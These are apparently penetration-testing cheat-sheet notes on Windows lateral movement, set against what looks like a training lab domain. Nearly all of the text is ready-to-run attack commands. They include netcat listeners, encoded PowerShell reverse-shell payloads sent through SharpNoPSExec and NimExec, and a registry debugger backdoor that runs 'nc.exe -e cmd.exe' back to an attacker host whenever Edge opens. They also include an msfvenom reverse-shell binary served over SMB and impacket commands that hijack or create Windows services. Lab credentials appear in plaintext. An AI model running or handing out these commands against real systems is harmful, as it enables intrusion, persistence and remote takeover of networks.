### Lateral movement from Windows
https://github.com/juliourena/SharpNoPSExec
The tool queries all services on the target machine, identifying those with a start type set to disabled or manual, current status of stopped, and running with LocalSystem privileges. It randomly selects one of these services and temporarily modifies its binary path to point to a payload of the attacker’s choice. Upon execution, SharpNoPSExec waits approximately 5 seconds before restoring the original service configuration, returning the service to its previous state. This approach not only provides a shell but also avoids the creation of new services, which security monitoring systems could flag.
```shell-session
//Setup a listener on KALI
nc -lnvp 8080

//Invoke the callback from the victim server
.\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="
```

https://github.com/frkngksl/NimExec
 An alternative is a fileless remote command execution tool that operates by exploiting the Service Control Manager Remote Protocol (MS-SCMR). Instead of using traditional `WinAPI` calls, `NimExec` manipulates the binary path of a specified or randomly selected service with LocalSystem privileges to execute a given command on the target machine and later restores the original configuration. This is achieved through custom-crafted RPC packets sent over `SMB` and the `svcctl` named pipe.
```shell-session
//Setup a listener on KALI
nc -lvnp 8080

//Invoke the callback from the victim server
.\NimExec -u helen -d inlanefreight.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v
```


### RCE via Registry(Windows FRIENDLY)
If you have write access on the Windows registry over the victim machine then you can do.
```shell-session
//Setup a listener on KALI
nc -lnvp 8080

//Host nc.exe from KALI 
sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe

//Allow insecure samba share access on the VICTIM
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f

//Invoke the callback from the victim server
reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"
```
(When the victim opens Edge.exe the backdoor will be called invoking a shell back to us.)


### RCE via Services(Linux Friendly)
```
//Getting a list of services from KALI
impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list

//Create the payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001.exe

//Setup the listener and serve the file via Sambashare from KALI
sudo impacket-smbserver share -smb2support ./

//Inject the backdoor in a service(ALG in my example)
impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name 'ALG' -path '\\10.10.14.195\share\rshell-9001.exe' -start_type 2


//Check the new config
impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'ALG'  
[*] Querying service config for ALG
TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
START_TYPE        :  3 -  DEMAND START
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : \\\\10.10.14.195\\share\\rshell-9001.exe
LOAD_ORDER_GROUP  : 
TAG               : 0
DISPLAY_NAME      : Application Layer Gateway Service
DEPENDENCIES      : /
SERVICE_START_NAME: INLANEFREIGHT\Lich

//Start the service(IF NEEDED!)
impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'ALG'
```
(Upon service start the shell should be fetched from the Sambashare URL on KALI and executed to get a shell). *Remember: allow access of shares as guest user otherwise won''t work.*
If you want to create a new service instead of editing one existing:
```shell-session
impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"
```
